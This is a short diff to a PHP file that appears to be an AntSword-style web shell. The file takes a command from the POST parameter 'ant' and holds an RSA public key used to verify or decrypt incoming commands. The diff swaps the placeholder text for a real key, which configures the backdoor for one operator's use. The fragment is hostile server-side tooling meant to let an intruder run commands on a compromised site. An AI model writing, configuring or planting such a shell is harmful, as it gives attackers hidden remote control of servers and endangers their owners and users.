@@ -17,7 +17,10 @@
 $cmd = @$_POST['ant'];
 $publicKey = <<<EOF
 -----BEGIN PUBLIC KEY-----
-Input your Public Key
+MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDfkSvRs2XrTxl/B9luPPxHq6hT
+Qjq0JAUsfMpicgR05PILVVHmLH7cdU2PCRt3XlRBtCQ0EW2SJkS2xb//2s5W3ZMo
+9KS0wsT8mxnPZ8O04+f0GQIRIHR/RIdi4klDAcwPF6Q23yE1p4Vz72xHkuOnszpb
+gpf0f1Jxmo40hzNV6wIDAQAB
 -----END PUBLIC KEY-----
 EOF;
 $cmds = explode("|", $cmd);
